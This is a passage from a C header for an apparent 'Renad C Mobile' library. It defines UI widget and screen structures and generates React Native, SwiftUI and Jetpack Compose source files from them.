    int            font_weight; /* 400=regular, 700=bold */
    /* children */
    struct RcWidget **children;
    int n_children;
    /* callbacks */
    void (*on_press)(struct RcWidget*);
    void (*on_change)(struct RcWidget*, const char*);
    char  value[512];
    int   flex;
} RcWidget;

typedef struct {
    char   title[128];
    RcWidget *root;
    void   (*on_mount)(void);
    void   (*on_unmount)(void);
    void   (*on_back)(void);
} RcScreen;

typedef struct {
    RcScreen *screens[64];
    int       n_screens;
    int       current;
    char      app_name[128];
    char      bundle_id[128]; /* com.developer.app */
    char      version[32];
    RcColor   primary_color;
    RcColor   accent_color;
    int       dark_mode;
} RcApp;

/* ── Color constants ─────────────────────────────────────── */
static const RcColor RC_BLACK   = {0,0,0,1};
static const RcColor RC_WHITE   = {1,1,1,1};
static const RcColor RC_BLUE    = {0.23,0.51,1,1};
static const RcColor RC_RED     = {0.97,0.44,0.44,1};
static const RcColor RC_GREEN   = {0.29,0.87,0.50,1};
static const RcColor RC_TRANS   = {0,0,0,0};

/* ── Widget constructors ─────────────────────────────────── */
static RcWidget *rc_widget_new(RcWidgetType type) {
    RcWidget *w = (RcWidget*)calloc(1, sizeof(RcWidget));
    w->type = type;
    w->bg   = RC_TRANS;
    w->fg   = RC_BLACK;
    w->font_size   = 14;
    w->font_weight = 400;
    w->flex = 1;
    w->children = (RcWidget**)malloc(64*sizeof(RcWidget*));
    return w;
}
static void rc_widget_add(RcWidget *parent, RcWidget *child) {
    parent->children[parent->n_children++] = child;
}

/* ── Render to React Native JSON ─────────────────────────── */
static void rc_render_rn(RcWidget *w, FILE *out, int indent) {
    for (int i=0;i<indent;i++) fprintf(out,"  ");
    const char *comp = "View";
    if      (w->type==RC_WIDGET_TEXT)   comp = "Text";
    else if (w->type==RC_WIDGET_BUTTON) comp = "TouchableOpacity";
    else if (w->type==RC_WIDGET_IMAGE)  comp = "Image";
    else if (w->type==RC_WIDGET_INPUT)  comp = "TextInput";
    else if (w->type==RC_WIDGET_LIST)   comp = "FlatList";
    fprintf(out, "<%s style={{backgroundColor:'rgba(%d,%d,%d,%.1f)',padding:%d}}",
            comp,
            (int)(w->bg.r*255),(int)(w->bg.g*255),(int)(w->bg.b*255),w->bg.a,
            (int)w->padding.top);
    if (w->text[0]) fprintf(out, " // \"%s\"", w->text);
    if (w->n_children == 0) { fprintf(out, " />\n"); return; }
    fprintf(out, ">\n");
    for (int i=0;i<w->n_children;i++) rc_render_rn(w->children[i], out, indent+1);
    for (int i=0;i<indent;i++) fprintf(out,"  ");
    fprintf(out, "</%s>\n", comp);
}

/* ── Render to Swift (iOS) ───────────────────────────────── */
static void rc_render_swift(RcWidget *w, FILE *out, int indent) {
    for (int i=0;i<indent;i++) fprintf(out,"    ");
    if      (w->type==RC_WIDGET_TEXT)
        fprintf(out, "Text(\"%s\").font(.system(size:%.0f, weight:%s))\n",
                w->text, w->font_size, w->font_weight>=700?".bold":".regular");
    else if (w->type==RC_WIDGET_BUTTON)
        fprintf(out, "Button(\"%s\") { /* action */ }\n", w->text);
    else if (w->type==RC_WIDGET_VIEW) {
        fprintf(out, "VStack(spacing: 8) {\n");
        for (int i=0;i<w->n_children;i++) rc_render_swift(w->children[i], out, indent+1);
        for (int i=0;i<indent;i++) fprintf(out,"    ");
        fprintf(out, "}\n");
    }
}

/* ── Render to Kotlin (Android) ──────────────────────────── */
static void rc_render_kotlin(RcWidget *w, FILE *out, int indent) {
    for (int i=0;i<indent;i++) fprintf(out,"    ");
    if      (w->type==RC_WIDGET_TEXT)
        fprintf(out, "Text(text = \"%s\", fontSize = %.0fsp)\n", w->text, w->font_size);
    else if (w->type==RC_WIDGET_BUTTON)
        fprintf(out, "Button(onClick = { /*TODO*/ }) { Text(\"%s\") }\n", w->text);
    else if (w->type==RC_WIDGET_VIEW) {
        fprintf(out, "Column {\n");
        for (int i=0;i<w->n_children;i++) rc_render_kotlin(w->children[i], out, indent+1);
        for (int i=0;i<indent;i++) fprintf(out,"    ");
        fprintf(out, "}\n");
    }
}

static RcApp *rc_app_new(const char *name, const char *bundle_id) {
    RcApp *app = (RcApp*)calloc(1, sizeof(RcApp));
    strncpy(app->app_name, name, 127);
    strncpy(app->bundle_id, bundle_id, 127);
    strcpy(app->version, "1.0.0");
    app->primary_color = RC_BLUE;
    return app;
}
static void rc_app_add_screen(RcApp *app, RcScreen *screen) {
    app->screens[app->n_screens++] = screen;
}
static void rc_app_export_rn(RcApp *app, const char *path) {
    char fname[512];
    for (int i=0;i<app->n_screens;i++) {
        snprintf(fname, sizeof(fname), "%s/%s.jsx", path, app->screens[i]->title);
        FILE *f = fopen(fname, "w");
        if (!f) continue;
        fprintf(f, "// Generated by Renad C Mobile — %s\n", app->app_name);
        fprintf(f, "import React from 'react';\nimport { View, Text, TouchableOpacity } from 'react-native';\n\n");
        fprintf(f, "export default function %sScreen() {\n  return (\n", app->screens[i]->title);
        rc_render_rn(app->screens[i]->root, f, 2);
        fprintf(f, "  );\n}\n");
        fclose(f);
        printf("[mobile] Exported %s → React Native\n", fname);
    }
}
static void rc_app_export_ios(RcApp *app, const char *path) {
    char fname[512];
    snprintf(fname, sizeof(fname), "%s/ContentView.swift", path);
    FILE *f = fopen(fname, "w");
    if (!f) return;
    fprintf(f, "// Generated by Renad C Mobile — %s\nimport SwiftUI\n\n", app->app_name);
    fprintf(f, "struct ContentView: View {\n    var body: some View {\n");
    if (app->n_screens > 0) rc_render_swift(app->screens[0]->root, f, 2);
    fprintf(f, "    }\n}\n");
    fclose(f);
    printf("[mobile] Exported → iOS (SwiftUI): %s\n", fname);
}
static void rc_app_export_android(RcApp *app, const char *path) {
    char fname[512];
    snprintf(fname, sizeof(fname), "%s/MainActivity.kt", path);
    FILE *f = fopen(fname, "w");
    if (!f) return;
    fprintf(f, "// Generated by Renad C Mobile — %s\n", app->app_name);
    fprintf(f, "import androidx.compose.material.*\nimport androidx.compose.runtime.*\n\n");
    fprintf(f, "@Composable\nfun App() {\n");
    if (app->n_screens > 0) rc_render_kotlin(app->screens[0]->root, f, 1);
    fprintf(f, "}\n");
    fclose(f);
    printf("[mobile] Exported → Android (Jetpack Compose): %s\n", fname);
}

/* ── Macros ──────────────────────────────────────────────── */
#define mobile_app(name, bundle)    rc_app_new(name, bundle)
#define mobile_screen(title)        ({ RcScreen *_s=calloc(1,sizeof(RcScreen)); strncpy(_s->title,title,127); _s; })
#define mobile_view()               rc_widget_new(RC_WIDGET_VIEW)
#define mobile_text(t)              ({ RcWidget *_w=rc_widget_new(RC_WIDGET_TEXT); strncpy(_w->text,t,1023); _w; })
#define mobile_button(t, fn)        ({ RcWidget *_w=rc_widget_new(RC_WIDGET_BUTTON); strncpy(_w->text,t,1023); _w->on_press=fn; _w; })
#define mobile_add(parent, child)   rc_widget_add(parent, child)
#define mobile_export_rn(app, path) rc_app_export_rn(app, path)
#define mobile_export_ios(app,path) rc_app_export_ios(app, path)
#define mobile_export_android(a,p)  rc_app_export_android(a, p)

#endif /* RC_HAS_MOBILE */
